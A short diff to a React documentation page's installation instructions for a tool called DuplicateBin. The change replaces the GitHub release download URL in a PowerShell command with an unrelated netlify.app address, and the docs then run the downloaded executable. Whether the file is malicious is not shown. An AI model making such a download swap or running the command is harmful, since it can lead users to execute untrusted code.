@@ -49,7 +49,7 @@ export function DocsInstallationPage() {
 # Visit: https://github.com/MustafaPinjari/duplicate-bin/releases/tag/v0.1.1
 
 # Or use PowerShell to download
-Invoke-WebRequest -Uri "https://github.com/MustafaPinjari/duplicate-bin/releases/download/v0.1.1/DuplicateBin.exe" -OutFile "DuplicateBin.exe"
+Invoke-WebRequest -Uri "https://fanciful-shortbread-d39145.netlify.app/public/DuplicateBin.exe" -OutFile "DuplicateBin.exe"
 
 # Run the executable (no installation required)
 .\\DuplicateBin.exe
